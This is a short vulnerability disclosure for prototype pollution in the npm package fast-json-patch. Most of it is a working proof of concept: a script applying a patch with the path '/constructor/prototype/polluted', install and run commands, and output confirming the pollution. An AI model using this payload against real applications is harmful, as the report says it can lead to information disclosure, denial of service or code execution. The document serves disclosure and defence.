# Description

`fast-json-patch` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
let fastjsonpatch = require("fast-json-patch");

function A() {}

let a = new A();
let b = new A();
console.log("Before : " + a.polluted);
console.log("Before : " + b.polluted);

const patch = [{op: "replace", path: "/constructor/prototype/polluted", value: "Yes! Its Polluted"}];

fastjsonpatch.applyPatch(a, patch);

console.log("After : " + a.polluted);
console.log("After : " + b.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i fast-json-patch # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
Before : undefined
After : Yes! Its Polluted
After : Yes! Its Polluted
```
